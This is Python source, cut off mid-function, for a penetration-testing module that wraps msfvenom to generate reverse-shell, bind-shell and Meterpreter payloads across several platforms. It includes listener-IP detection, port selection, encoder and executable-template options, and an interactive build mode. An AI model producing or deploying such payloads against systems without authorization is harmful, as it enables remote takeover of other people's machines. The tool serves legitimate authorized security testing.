#!/usr/bin/env python3
"""
JASMIN Payload Module - Complete Implementation
Three-Tier Payload Generation System for Penetration Testing

Usage:
  jasmin> payload windows          # Tier 1: Quick shortcuts
  jasmin> payload browse           # Tier 2: Guided browsing  
  jasmin> payload build            # Tier 3: Advanced builder

Author: JASMIN Framework
"""

import os
import re
import json
import socket
import subprocess
import threading
import time
import shutil
from pathlib import Path
from typing import Dict, List, Optional, Union, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import ipaddress

try:
    import netifaces
except ImportError:
    print("[!] Warning: netifaces not installed. Network detection will be limited.")
    netifaces = None

# ============================================================================
# LAYER 1: CORE FOUNDATION CLASSES
# ============================================================================

@dataclass
class PayloadConfig:
    """Central configuration class for all payload generation"""
    payload_type: Optional[str] = None
    lhost: Optional[str] = None
    lport: Optional[int] = None
    format: Optional[str] = None
    encoder: Optional[str] = None
    iterations: int = 1
    template: Optional[str] = None
    badchars: Optional[str] = None
    arch: Optional[str] = None
    platform: Optional[str] = None
    custom_options: Dict[str, Union[str, int]] = field(default_factory=dict)
    target_name: Optional[str] = None
    description: Optional[str] = None
    created_timestamp: Optional[str] = None
    
    def __post_init__(self):
        if self.created_timestamp is None:
            self.created_timestamp = datetime.now().isoformat()
        if self.payload_type and not self.platform:
            self.platform = self._extract_platform_from_payload()
        if self.payload_type and not self.arch:
            self.arch = self._extract_arch_from_payload()
    
    def _extract_platform_from_payload(self) -> Optional[str]:
        if '/' in self.payload_type:
            return self.payload_type.split('/')[0]
        return None
    
    def _extract_arch_from_payload(self) -> Optional[str]:
        if 'x64' in self.payload_type or 'x86_64' in self.payload_type:
            return 'x64'
        elif 'x86' in self.payload_type:
            return 'x86'
        return None
    
    def to_msfvenom_command(self) -> List[str]:
        cmd = ['msfvenom']
        if self.payload_type:
            cmd.extend(['-p', self.payload_type])
        if self.lhost:
            cmd.append(f'LHOST={self.lhost}')
        if self.lport:
            cmd.append(f'LPORT={self.lport}')
        if self.encoder:
            cmd.extend(['-e', self.encoder])
        if self.iterations > 1:
            cmd.extend(['-i', str(self.iterations)])
        if self.badchars:
            cmd.extend(['-b', self.badchars])
        if self.template:
            cmd.extend(['-x', self.template])
        if self.arch:
            cmd.extend(['-a', self.arch])
        if self.platform:
            cmd.extend(['--platform', self.platform])
        if self.format:
            cmd.extend(['-f', self.format])
        for key, value in self.custom_options.items():
            cmd.append(f"{key}={value}")
        return cmd
    
    def validate(self) -> Tuple[bool, List[str]]:
        errors = []
        if not self.payload_type:
            errors.append("Payload type is required")
        if self.payload_type and 'reverse' in self.payload_type:
            if not self.lhost:
                errors.append("LHOST is required for reverse payloads")
            elif self.lhost and not self._is_valid_ip(self.lhost):
                errors.append(f"Invalid LHOST IP address: {self.lhost}")
            if not self.lport:
                errors.append("LPORT is required for reverse payloads")
            elif self.lport and not (1 <= self.lport <= 65535):
                errors.append(f"LPORT must be between 1-65535: {self.lport}")
        return len(errors) == 0, errors
    
    def _is_valid_ip(self, ip: str) -> bool:
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def get_smart_filename(self, target_name: str = None) -> str:
        parts = []
        if target_name:
            parts.append(target_name)
        elif self.target_name:
            parts.append(self.target_name)
        else:
            parts.append("payload")
        
        if self.platform:
            parts.append(self.platform)
        if self.payload_type:
            payload_simple = self.payload_type.split('/')[-1]
            if len(payload_simple) > 20:
                payload_simple = payload_simple[:17] + "..."
            parts.append(payload_simple)
        if self.lport:
            parts.append(str(self.lport))
        
        filename = "_".join(parts)
        if self.format:
            ext_map = {
                'exe': 'exe', 'elf': 'elf', 'macho': 'macho',
                'python': 'py', 'powershell': 'ps1', 'java': 'jar',
                'jsp': 'jsp', 'war': 'war', 'php': 'php', 'aspx': 'aspx'
            }
            ext = ext_map.get(self.format, 'bin')
            filename += f".{ext}"
        return filename
    
    def to_dict(self) -> Dict:
        return {
            'payload_type': self.payload_type, 'lhost': self.lhost, 'lport': self.lport,
            'format': self.format, 'encoder': self.encoder, 'iterations': self.iterations,
            'template': self.template, 'badchars': self.badchars, 'arch': self.arch,
            'platform': self.platform, 'custom_options': self.custom_options,
            'target_name': self.target_name, 'description': self.description,
            'created_timestamp': self.created_timestamp
        }
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'PayloadConfig':
        return cls(**data)
    
    def clone(self) -> 'PayloadConfig':
        return PayloadConfig.from_dict(self.to_dict())


class NetworkDetection:
    """Auto-detect network settings for payload configuration"""
    
    def get_lhost(self) -> Optional[str]:
        if netifaces is None:
            return self._fallback_ip_detection()
        
        # Priority 1: VPN interfaces
        vpn_interfaces = ['tun0', 'tun1', 'tap0', 'wg0', 'vpn0']
        for iface in vpn_interfaces:
            ip = self._get_interface_ip(iface)
            if ip:
                return ip
        
        # Priority 2: Primary interface
        primary_ip = self._get_primary_interface_ip()
        if primary_ip:
            return primary_ip
        
        return self._get_best_guess_ip()
    
    def _get_interface_ip(self, interface: str) -> Optional[str]:
        if netifaces is None:
            return None
        try:
            if interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    return addrs[netifaces.AF_INET][0]['addr']
        except:
            pass
        return None
    
    def _get_primary_interface_ip(self) -> Optional[str]:
        if netifaces is None:
            return None
        try:
            gws = netifaces.gateways()
            if 'default' in gws and netifaces.AF_INET in gws['default']:
                iface = gws['default'][netifaces.AF_INET][1]
                return self._get_interface_ip(iface)
        except:
            pass
        return None
    
    def _get_best_guess_ip(self) -> Optional[str]:
        if netifaces is None:
            return self._fallback_ip_detection()
        try:
            for iface in netifaces.interfaces():
                if iface.startswith('lo'):
                    continue
                ip = self._get_interface_ip(iface)
                if ip and ip != '127.0.0.1':
                    return ip
        except:
            pass
        return self._fallback_ip_detection()
    
    def _fallback_ip_detection(self) -> Optional[str]:
        """Fallback when netifaces is not available"""
        try:
            # Connect to a remote address to get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None
    
    def find_free_port(self, preferred: int = 4444) -> int:
        if self._is_port_free(preferred):
            return preferred
        
        common_ports = [4444, 4443, 4445, 1337, 31337, 8080, 8443]
        for port in common_ports:
            if port != preferred and self._is_port_free(port):
                return port
        
        for port in range(4444, 65535):
            if self._is_port_free(port):
                return port
        return preferred
    
    def _is_port_free(self, port: int) -> bool:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('127.0.0.1', port))
                return True
        except OSError:
            return False
    
    def suggest_port_by_protocol(self, protocol: str) -> int:
        protocol_ports = {
            'tcp': 4444, 'http': 8080, 'https': 443, 'dns': 53,
            'smb': 445, 'rdp': 3389, 'ssh': 22, 'ftp': 21
        }
        suggested = protocol_ports.get(protocol.lower(), 4444)
        return self.find_free_port(suggested)


class MsfvenomWrapper:
    """Interface to msfvenom binary with enhanced error handling"""
    
    def __init__(self):
        self.msfvenom_path = None
        self.payload_cache = None
        self.encoder_cache = None
        
        # Try to find msfvenom without raising exceptions during init
        try:
            self.msfvenom_path = self._find_msfvenom()
        except Exception as e:
            print(f"[!] Warning: {e}")
            print("[!] Payload generation will not be available")
            self.msfvenom_path = None
    
    def _find_msfvenom(self) -> str:
        # Direct path check first
        if Path("/usr/bin/msfvenom").exists():
            return "/usr/bin/msfvenom"
        
        # Then try shutil.which
        import shutil
        which_result = shutil.which('msfvenom')
        if which_result:
            return which_result
        
        raise FileNotFoundError("msfvenom not found")
    
    def _is_executable(self, path: str) -> bool:
        try:
            result = subprocess.run([path, '--help'], capture_output=True, timeout=3)
            return result.returncode == 0
        except:
            return True  # Assume it's executable if we can't test
    
    def is_available(self) -> bool:
        """Check if msfvenom is available"""
        return self.msfvenom_path is not None
    
    def execute_command(self, config, output_path: str = None):
        """Execute msfvenom command with availability check"""
        if not self.is_available():
            return False, "msfvenom is not available. Please install Metasploit Framework.", b''
        
        is_valid, errors = config.validate()
        if not is_valid:
            return False, f"Configuration errors: {'; '.join(errors)}", b''
        
        cmd = config.to_msfvenom_command()
        # Replace 'msfvenom' with full path
        cmd[0] = self.msfvenom_path
        
        if output_path:
            cmd.extend(['-o', output_path])
        
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=60)
            if result.returncode == 0:
                message = "Payload generated successfully"
                if result.stderr:
                    message += f"\nWarnings: {result.stderr.decode()}"
                payload_data = result.stdout if not output_path else b''
                return True, message, payload_data
            else:
                error_msg = result.stderr.decode() if result.stderr else "Unknown error"
                return False, f"msfvenom failed: {error_msg}", b''
        except subprocess.TimeoutExpired:
            return False, "msfvenom command timed out", b''
        except Exception as e:
            return False, f"Execution error: {str(e)}", b''
    
    def list_payloads(self, filter_platform: str = None):
        """List payloads with availability check"""
        if not self.is_available():
            return []
        
        if self.payload_cache is None:
            self._refresh_payload_cache()
        
        payloads = self.payload_cache or []
        if filter_platform:
            payloads = [p for p in payloads if p['name'].startswith(filter_platform.lower())]
        return payloads
    
    def _refresh_payload_cache(self):
        """Refresh payload cache with availability check"""
        if not self.is_available():
            self.payload_cache = []
            return
        
        try:
            result = subprocess.run(
                [self.msfvenom_path, '-l', 'payloads'], 
                capture_output=True, 
                timeout=30
            )
            if result.returncode == 0:
                self.payload_cache = self._parse_payload_list(result.stdout.decode())
            else:
                self.payload_cache = []
        except Exception:
            self.payload_cache = []
    
    def _parse_payload_list(self, output: str):
        """Parse msfvenom payload list output"""
        payloads = []
        in_payload_section = False
        for line in output.split('\n'):
            line = line.strip()
            if 'Name' in line and 'Description' in line:
                in_payload_section = True
                continue
            if not in_payload_section or not line or line.startswith('='):
                continue
            parts = line.split(None, 1)
            if len(parts) >= 2:
                payloads.append({'name': parts[0], 'description': parts[1] if len(parts) > 1 else ''})
        return payloads


# ============================================================================
# LAYER 2: COMMAND PARSING & INTENT RECOGNITION  
# ============================================================================

class CommandType(Enum):
    QUICK_GENERATE = "quick_generate"
    BUILD_MODE = "build_mode"
    BROWSE = "browse"
    SEARCH = "search"
    CONFIGURE = "configure"
    HELP = "help"


class AttackType(Enum):
    REVERSE = "reverse"
    BIND = "bind"
    METERPRETER = "meterpreter"
    SHELL = "shell"
    STAGED = "staged"
    STAGER = "stager"


@dataclass
class PayloadIntent:
    """Structured representation of user intent"""
    command_type: CommandType
    platform: Optional[str] = None
    attack_type: Optional[AttackType] = None
    protocol: Optional[str] = None
    architecture: Optional[str] = None
    search_terms: List[str] = field(default_factory=list)
    exclusions: List[str] = field(default_factory=list)
    flags: Dict[str, any] = field(default_factory=dict)
    raw_tokens: List[str] = field(default_factory=list)
    
    def __post_init__(self):
        if self.platform:
            self.platform = self._normalize_platform(self.platform)
        if isinstance(self.attack_type, str):
            self.attack_type = self._normalize_attack_type(self.attack_type)
    
    def _normalize_platform(self, platform: str) -> str:
        platform_map = {
            'win': 'windows', 'win32': 'windows', 'win64': 'windows',
            'lin': 'linux', 'unix': 'linux', 'osx': 'osx', 'mac': 'osx',
            'macos': 'osx', 'android': 'android', 'droid': 'android'
        }
        return platform_map.get(platform.lower(), platform.lower())
    
    def _normalize_attack_type(self, attack_type: str) -> Optional[AttackType]:
        attack_map = {
            'reverse': AttackType.REVERSE, 'rev': AttackType.REVERSE,
            'bind': AttackType.BIND, 'meterpreter': AttackType.METERPRETER,
            'msfvenom': AttackType.METERPRETER, 'met': AttackType.METERPRETER,
            'shell': AttackType.SHELL, 'sh': AttackType.SHELL,
            'staged': AttackType.STAGED, 'stager': AttackType.STAGER
        }
        return attack_map.get(attack_type.lower())


class CommandParser:
    """Parses JASMIN payload commands into structured PayloadIntent objects"""
    
    def __init__(self):
        self.platform_patterns = {
            'windows': ['windows', 'win', 'win32', 'win64'],
            'linux': ['linux', 'lin', 'unix'],
            'osx': ['osx', 'mac', 'macos'],
            'android': ['android', 'droid']
        }
        self.attack_patterns = {
            AttackType.REVERSE: ['reverse', 'rev'],
            AttackType.BIND: ['bind'],
            AttackType.METERPRETER: ['meterpreter', 'met', 'msf'],
            AttackType.SHELL: ['shell', 'sh'],
            AttackType.STAGED: ['staged'],
            AttackType.STAGER: ['stager']
        }
        self.protocol_patterns = {
            'tcp': ['tcp'], 'http': ['http'], 'https': ['https', 'ssl', 'tls'],
            'dns': ['dns'], 'smb': ['smb'], 'udp': ['udp']
        }
        self.arch_patterns = {
            'x86': ['x86', '32', 'i386'],
            'x64': ['x64', '64', 'amd64', 'x86_64']
        }
    
    def parse_payload_command(self, tokens: List[str]) -> PayloadIntent:
        if not tokens or tokens[0] != 'payload':
            raise ValueError("Not a payload command")
        tokens = tokens[1:]
        tokens, flags = self._extract_flags(tokens)
        command_type = self._detect_command_type(tokens, flags)
        intent = PayloadIntent(command_type=command_type, flags=flags, raw_tokens=tokens)
        
        if command_type == CommandType.QUICK_GENERATE:
            self._parse_quick_generate(intent, tokens)
        elif command_type == CommandType.BUILD_MODE:
            self._parse_build_mode(intent, tokens)
        elif command_type == CommandType.BROWSE:
            self._parse_browse(intent, tokens)
        elif command_type == CommandType.SEARCH:
            self._parse_search(intent, tokens)
        
        return intent
    
    def _extract_flags(self, tokens: List[str]) -> Tuple[List[str], Dict[str, any]]:
        flags = {}
        clean_tokens = []
        i = 0
        while i < len(tokens):
            token = tokens[i]
            if token.startswith('--'):
                flag_name = token[2:]
                if flag_name in ['port', 'lport', 'lhost', 'format', 'encoder', 'arch']:
                    if i + 1 < len(tokens) and not tokens[i + 1].startswith('--'):
                        flags[flag_name] = tokens[i + 1]
                        i += 2
                    else:
                        flags[flag_name] = True
                        i += 1
                elif flag_name == 'exclude':
                    exclusions = []
                    i += 1
                    while i < len(tokens) and not tokens[i].startswith('--'):
                        exclusions.append(tokens[i])
                        i += 1
                    flags['exclude'] = exclusions
                else:
                    flags[flag_name] = True
                    i += 1
            else:
                clean_tokens.append(token)
                i += 1
        return clean_tokens, flags
    
    def _detect_command_type(self, tokens: List[str], flags: Dict[str, any]) -> CommandType:
        """Fixed version that properly detects search commands anywhere in tokens"""
        if not tokens:
            return CommandType.HELP
        
        # Check for specific command keywords anywhere in tokens (not just first position)
        if 'search' in tokens:
            return CommandType.SEARCH
        if 'browse' in tokens:
            return CommandType.BROWSE
        if 'build' in tokens:
            return CommandType.BUILD_MODE
        if tokens[0] in ['help', '?']:
            return CommandType.HELP
        
        # Check flags
        if flags.get('build'):
            return CommandType.BUILD_MODE
        if flags.get('browse'):
            return CommandType.BROWSE
        if flags.get('search'):
            return CommandType.SEARCH
        
        # Default to quick generate for everything else
        return CommandType.QUICK_GENERATE
    
    def _parse_quick_generate(self, intent: PayloadIntent, tokens: List[str]):
        intent.platform = self._extract_platform(tokens)
        intent.attack_type = self._extract_attack_type(tokens)
        intent.protocol = self._extract_protocol(tokens)
        intent.architecture = self._extract_architecture(tokens)
        
        if 'meterpreter' in tokens:
            intent.attack_type = AttackType.METERPRETER
            if intent.flags.get('linux'):
                intent.platform = 'linux'
            elif not intent.platform:
                intent.platform = 'windows'
    
    def _parse_build_mode(self, intent: PayloadIntent, tokens: List[str]):
        if 'build' in tokens:
            tokens.remove('build')
        if tokens:
            self._parse_quick_generate(intent, tokens)
    
    def _parse_browse(self, intent: PayloadIntent, tokens: List[str]):
        if 'browse' in tokens:
            tokens.remove('browse')
        intent.platform = self._extract_platform(tokens)
        intent.attack_type = self._extract_attack_type(tokens)
        intent.protocol = self._extract_protocol(tokens)
        if 'exclude' in intent.flags:
            intent.exclusions = intent.flags['exclude']
    
    def _parse_search(self, intent: PayloadIntent, tokens: List[str]):
        """Parse search commands with proper platform/context handling"""
        if 'search' in tokens:
            search_idx = tokens.index('search')
            context_tokens = tokens[:search_idx]  # Everything before 'search'
            search_tokens = tokens[search_idx + 1:]  # Everything after 'search'
        else:
            # No explicit 'search' keyword found, treat all as search terms
            context_tokens = []
            search_tokens = tokens
        
        # Extract context (platform, attack type, etc.) from tokens before 'search'
        if context_tokens:
            intent.platform = self._extract_platform(context_tokens)
            intent.attack_type = self._extract_attack_type(context_tokens)
            intent.protocol = self._extract_protocol(context_tokens)
            intent.architecture = self._extract_architecture(context_tokens)
        
        # Set search terms
        intent.search_terms = search_tokens
        
        # Handle exclusions from flags
        if 'exclude' in intent.flags:
            intent.exclusions = intent.flags['exclude']
        
    
    def _extract_platform(self, tokens: List[str]) -> Optional[str]:
        for token in tokens:
            for platform, patterns in self.platform_patterns.items():
                if token.lower() in patterns:
                    return platform
        return None
    
    def _extract_attack_type(self, tokens: List[str]) -> Optional[AttackType]:
        for token in tokens:
            for attack_type, patterns in self.attack_patterns.items():
                if token.lower() in patterns:
                    return attack_type
        return None
    
    def _extract_protocol(self, tokens: List[str]) -> Optional[str]:
        for token in tokens:
            for protocol, patterns in self.protocol_patterns.items():
                if token.lower() in patterns:
                    return protocol
        return None
    
    def _extract_architecture(self, tokens: List[str]) -> Optional[str]:
        for token in tokens:
            for arch, patterns in self.arch_patterns.items():
                if token.lower() in patterns:
                    return arch
        return None


# ============================================================================
# LAYER 3: PAYLOAD SELECTION LOGIC
# ============================================================================

class PayloadDatabase:
    """Central payload knowledge and search capabilities"""
    
    def __init__(self, msfvenom_wrapper: MsfvenomWrapper):
        self.msfvenom = msfvenom_wrapper
        self.payloads = []
        self.categories = {}
        self.mappings = self._load_common_mappings()
        self._refresh_database()
    
    def _refresh_database(self):
        """Load payloads from msfvenom"""
        self.payloads = self.msfvenom.list_payloads()
        self.categories = self._build_categories()
    
    def _build_categories(self) -> Dict:
        """Build hierarchical categories from payload list"""
        categories = {}
        for payload in self.payloads:
            parts = payload['name'].split('/')
            if len(parts) >= 2:
                platform = parts[0]
                if platform not in categories:
                    categories[platform] = {'payloads': [], 'subcategories': {}}
                categories[platform]['payloads'].append(payload)
        return categories
    
    def search(self, query: str, filters: Dict = None) -> List[Dict[str, str]]:
        """Search payloads with wildcard and regex support"""
        results = []
        query_lower = query.lower()
        
        for payload in self.payloads:
            name_lower = payload['name'].lower()
            desc_lower = payload['description'].lower()
            
            # Wildcard search
            if '*' in query_lower:
                pattern = query_lower.replace('*', '.*')
                if re.search(pattern, name_lower) or re.search(pattern, desc_lower):
                    results.append(payload)
            # Simple substring search
            elif query_lower in name_lower or query_lower in desc_lower:
                results.append(payload)
        
        # Apply filters
        if filters:
            if 'platform' in filters:
                results = [p for p in results if p['name'].startswith(filters['platform'])]
            if 'exclude' in filters:
                for exclude_term in filters['exclude']:
                    results = [p for p in results if exclude_term.lower() not in p['name'].lower()]
        
        return results[:50]  # Limit results
    
    def get_by_category(self, platform: str, attack_type: str = None) -> List[Dict[str, str]]:
        """Get payloads by category"""
        if platform not in self.categories:
            return []
        
        payloads = self.categories[platform]['payloads']
        
        if attack_type:
            filtered = []
            for payload in payloads:
                if attack_type.lower() in payload['name'].lower():
                    filtered.append(payload)
            return filtered
        
        return payloads
    
    def _load_common_mappings(self) -> Dict:
        """Load common payload mappings for quick generation"""
        return {
            'windows': {
                'reverse': 'windows/shell_reverse_tcp',
                'bind': 'windows/shell_bind_tcp',
                'meterpreter': 'windows/meterpreter/reverse_tcp',
                'http': 'windows/shell/reverse_http',
                'https': 'windows/shell/reverse_https'
            },
            'linux': {
                'reverse': 'linux/x86/shell_reverse_tcp',
                'bind': 'linux/x86/shell_bind_tcp',
                'meterpreter': 'linux/x86/meterpreter/reverse_tcp',
                'http': 'linux/x86/shell/reverse_http',
                'https': 'linux/x86/shell/reverse_https'
            },
            'android': {
                'reverse': 'android/shell/reverse_tcp',
                'meterpreter': 'android/meterpreter/reverse_tcp',
                'http': 'android/shell/reverse_http',
                'https': 'android/shell/reverse_https'
            },
            'osx': {
                'reverse': 'osx/x86/shell_reverse_tcp',
                'bind': 'osx/x86/shell_bind_tcp'
            }
        }


class PayloadMapper:
    """Maps PayloadIntent to actual msfvenom payload names"""
    
    def __init__(self, database: PayloadDatabase):
        self.database = database
        self.smart_defaults = self._load_smart_defaults()
    
    def intent_to_payload_type(self, intent: PayloadIntent) -> Optional[str]:
        """Convert PayloadIntent to specific msfvenom payload name"""
        if not intent.platform:
            return None
        
        # Check common mappings first
        mappings = self.database.mappings.get(intent.platform, {})
        
        # Build search key
        if intent.attack_type == AttackType.METERPRETER:
            search_key = 'meterpreter'
        elif intent.attack_type == AttackType.BIND:
            search_key = 'bind'
        elif intent.protocol:
            search_key = intent.protocol
        else:
            search_key = 'reverse'  # Default
        
        # Get mapped payload
        payload_type = mappings.get(search_key)
        
        if payload_type:
            # Apply architecture modifications
            if intent.architecture == 'x64' and intent.platform in ['linux', 'windows']:
                payload_type = payload_type.replace('/x86/', '/x64/')
            return payload_type
        
        # Fallback: construct from components
        return self._construct_payload_name(intent)
    
    def _construct_payload_name(self, intent: PayloadIntent) -> str:
        """Construct payload name from intent components"""
        parts = [intent.platform]
        
        if intent.architecture and intent.platform in ['linux', 'windows']:
            parts.append(intent.architecture)
        
        if intent.attack_type == AttackType.METERPRETER:
            parts.append('meterpreter')
        else:
            parts.append('shell')
        
        conn_type = 'bind' if intent.attack_type == AttackType.BIND else 'reverse'
        protocol = intent.protocol or 'tcp'
        parts.append(f'{conn_type}_{protocol}')
        
        return '/'.join(parts)
    
    def get_smart_defaults(self, platform: str, attack_type: AttackType = None) -> Dict[str, any]:
        """Return sensible defaults for platform/attack combinations"""
        defaults = self.smart_defaults.get(platform, {})
        if attack_type:
            attack_defaults = defaults.get(attack_type.value, {})
            defaults.update(attack_defaults)
        return defaults
    
    def _load_smart_defaults(self) -> Dict:
        """Load smart default configurations"""
        return {
            'windows': {
                'format': 'exe', 'architecture': 'x86', 'port': 4444,
                'reverse': {'format': 'exe', 'port': 4444},
                'meterpreter': {'format': 'exe', 'port': 4444}
            },
            'linux': {
                'format': 'elf', 'architecture': 'x86', 'port': 4444,
                'reverse': {'format': 'elf', 'port': 4444}
            },
            'android': {'format': 'raw', 'port': 4444},
            'osx': {'format': 'macho', 'port': 4444}
        }


class SelectionEngine:
    """Handles payload selection logic for all tiers"""
    
    def __init__(self, database: PayloadDatabase):
        self.database = database
        self.mapper = PayloadMapper(database)
    
    def quick_select(self, intent: PayloadIntent) -> PayloadConfig:
        """Tier 1: immediate selection with smart defaults"""
        config = PayloadConfig()
        config.payload_type = self.mapper.intent_to_payload_type(intent)
        
        defaults = self.mapper.get_smart_defaults(intent.platform, intent.attack_type)
        if defaults.get('format'):
            config.format = defaults['format']
        if defaults.get('architecture'):
            config.arch = defaults['architecture']
        
        # Apply flags
        for flag, value in intent.flags.items():
            if flag in ['port', 'lport']:
                config.lport = int(value)
            elif flag == 'lhost':
                config.lhost = value
            elif flag == 'format':
                config.format = value
            elif flag == 'encoder':
                config.encoder = value
            elif flag == 'arch':
                config.arch = value
        
        return config
    
    def browse_select(self, intent: PayloadIntent) -> List[Dict[str, str]]:
        """Tier 2: interactive browsing"""
        filters = {}
        if intent.platform:
            filters['platform'] = intent.platform
        if intent.exclusions:
            filters['exclude'] = intent.exclusions
        
        if intent.platform and intent.attack_type:
            return self.database.get_by_category(intent.platform, intent.attack_type.value)
        elif intent.platform:
            return self.database.get_by_category(intent.platform)
        else:
            return list(self.database.categories.keys())
    
    def search_select(self, intent: PayloadIntent) -> List[Dict[str, str]]:
        """Tier 2: search-based selection"""
        if not intent.search_terms:
            return []
        
        filters = {}
        if intent.platform:
            filters['platform'] = intent.platform
        if intent.exclusions:
            filters['exclude'] = intent.exclusions
        
        results = []
        for term in intent.search_terms:
            results.extend(self.database.search(term, filters))
        
        # Remove duplicates while preserving order
        seen = set()
        unique_results = []
        for result in results:
            if result['name'] not in seen:
                seen.add(result['name'])
                unique_results.append(result)
        
        return unique_results


# ============================================================================
# LAYER 4: USER INTERFACE COMPONENTS
# ============================================================================

class PreviewInterface:
    """Generation preview and confirmation interface"""
    
    def show_preview(self, config: PayloadConfig, target_name: str = None) -> str:
        """Show command preview and get user confirmation"""
        cmd = ' '.join(config.to_msfvenom_command())
        filename = config.get_smart_filename(target_name)
        
        preview = f"""[*] Generated payload configuration:
    Command: {cmd}
    Output: {filename}"""
        
        if target_name:
            preview += f"\n    Target: {target_name}"
        if config.lhost:
            preview += f"\n    LHOST: {config.lhost}"
        if config.lport:
            preview += f"\n    LPORT: {config.lport}"
        
        return preview
    
    def prompt_action(self) -> str:
        """Return action prompt"""
        return "\n[?] (G)enerate, (C)onfigure further, or (A)bort? [G/c/a]: "


class BrowseInterface:
    """Interactive browsing interface"""
    
    def __init__(self, database: PayloadDatabase):
        self.database = database
        self.current_category = "root"
        self.active_filters = []
    
    def show_menu(self, category: str = "root", items: List = None, filters: List[str] = None) -> str:
        """Show numbered menu of options"""
        if items is None:
            if category == "root":
                items = list(self.database.categories.keys())
            else:
                items = self.database.get_by_category(category)
        
        menu = f"\n[*] Browse Payloads"
        if category != "root":
            menu += f" - {category.title()}"
        if filters:
            menu += f" (excluding: {', '.join(filters)})"
        menu += ":\n"
        
        if isinstance(items, list) and items and isinstance(items[0], str):
            # Platform list
            for i, platform in enumerate(items, 1):
                count = len(self.database.categories.get(platform, {}).get('payloads', []))
                menu += f"    {i:2d}. {platform.title()} ({count} payloads)\n"
        else:
            # Payload list - show selection instructions
            for i, payload in enumerate(items[:20], 1):  # Limit to 20
                name = payload['name'] if isinstance(payload, dict) else str(payload)
                desc = payload.get('description', '')[:60] if isinstance(payload, dict) else ''
                menu += f"    {i:2d}. {name}\n"
                if desc:
                    menu += f"        {desc}\n"
            
            if len(items) > 20:
                menu += f"\n    ... and {len(items) - 20} more (use search to filter)\n"
            
            # Add selection instructions for payload lists
            menu += f"\n[*] Selection Options:"
            menu += f"\n    <number>     Select payload and configure"
            menu += f"\n    g<number>    Select payload and generate immediately"
            menu += f"\n    b<number>    Select payload and enter build mode"
        
        menu += "\n    0. Back / Exit"
        if category != "root":
            menu += "\n\nEnter your choice: "
        else:
            menu += "\n"
        return menu
    
    def drill_down(self, selection: int, items: List) -> Tuple[str, List]:
        """Navigate deeper into categories"""
        if selection == 0:
            return "root", []
        
        if selection <= len(items):
            selected = items[selection - 1]
            if isinstance(selected, str):
                # Selected a platform
                return selected, self.database.get_by_category(selected)
            else:
                # Selected a payload
                return "selected", [selected]
        
        return self.current_category, items
    
    def apply_filters(self, exclusions: List[str], items: List) -> List:
        """Filter current view"""
        if not exclusions or not items:
            return items
        
        filtered = []
        for item in items:
            if isinstance(item, dict):
                name = item['name'].lower()
                if not any(excl.lower() in name for excl in exclusions):
                    filtered.append(item)
            elif isinstance(item, str):
                if not any(excl.lower() in item.lower() for excl in exclusions):
                    filtered.append(item)
        
        return filtered


class BuildModeInterface:
    """MSF-style configuration interface"""
    
    def __init__(self, config: PayloadConfig, database: PayloadDatabase = None):
        self.config = config
        self.database = database  # For search functionality
        self.active = True
        self.search_results = []
        # Remove the prompt property - prompts are now handled centrally in cli.py
    
    def _get_short_name(self) -> str:
        """Get short name for prompt"""
        if self.config.payload_type:
            return self.config.payload_type.split('/')[-1]
        return "config"
    
    def update_config(self, new_config: PayloadConfig):
        """Update the configuration and refresh prompt if needed"""
        self.config = new_config
        # No need to update prompt here - it's handled dynamically
    
    def handle_command(self, command: str) -> str:
        """Handle build mode commands with enhanced MSF-style interface"""
        parts = command.strip().split()
        if not parts:
            return ""
        
        cmd = parts[0].lower()
        
        if cmd == 'show':
            if len(parts) == 1:
                return self.show_options()
            elif parts[1].lower() == 'options':
                return self.show_options()
            elif parts[1].lower() == 'payloads':
                # show payloads [filter1] [filter2] ...
                filters = parts[2:] if len(parts) > 2 else []
                return self.show_payloads(filters)
            elif parts[1].lower() == 'encoders':
                return self.show_encoders()
            elif parts[1].lower() == 'formats':
                return self.show_formats()
            else:
                return f"[!] Unknown show command: {parts[1]}. Try: options, payloads, encoders, formats"
        
        elif cmd == 'set':
            if len(parts) < 3:
                return "[!] Usage: set <option> <value>"
            return self.set_option(parts[1], parts[2])
        
        elif cmd == 'unset':
            if len(parts) < 2:
                return "[!] Usage: unset <option>"
            return self.unset_option(parts[1])
        
        elif cmd == 'search':
            if len(parts) < 2:
                return "[!] Usage: search <term>"
            return self.search_payloads(" ".join(parts[1:]))
        
        elif cmd == 'use':
            if len(parts) < 2:
                return "[!] Usage: use <payload_name>"
            return self.use_payload(" ".join(parts[1:]))
        
        elif cmd == 'generate' or cmd == 'run':
            self.active = False
            return "[*] Generating payload..."
        
        elif cmd in ['exit', 'quit', 'back']:
            self.active = False
            return "[*] Exiting build mode"
        
        elif cmd == 'help':
            return self.show_help()
        
        else:
            return f"[!] Unknown command: {cmd}. Type 'help' for available commands."
    
    def show_options(self) -> str:
        """Show current configuration options in MSF style with categories"""
        if not self.config.payload_type:
            return self._show_basic_options()
        
        options = f"\n[*] Payload options ({self.config.payload_type}):\n\n"
        options += f"   {'Name':<15} {'Current Setting':<20} {'Required':<10} {'Description'}\n"
        options += f"   {'='*15} {'='*20} {'='*10} {'='*30}\n"
        
        # Core payload options
        lhost_req = "yes" if self.config.payload_type and 'reverse' in self.config.payload_type else "no"
        lport_req = "yes" if self.config.payload_type and ('reverse' in self.config.payload_type or 'bind' in self.config.payload_type) else "no"
        
        options += f"   {'LHOST':<15} {str(self.config.lhost or ''):<20} {lhost_req:<10} {'The listen address'}\n"
        options += f"   {'LPORT':<15} {str(self.config.lport or ''):<20} {lport_req:<10} {'The listen port'}\n"
        
        # Add protocol-specific options
        if self.config.payload_type and 'http' in self.config.payload_type:
            luri = self.config.custom_options.get('LURI', '')
            options += f"   {'LURI':<15} {str(luri):<20} {'no':<10} {'The HTTP URI'}\n"
            
            user_agent = self.config.custom_options.get('UserAgent', '')
            options += f"   {'UserAgent':<15} {str(user_agent):<20} {'no':<10} {'The User-Agent header'}\n"
        
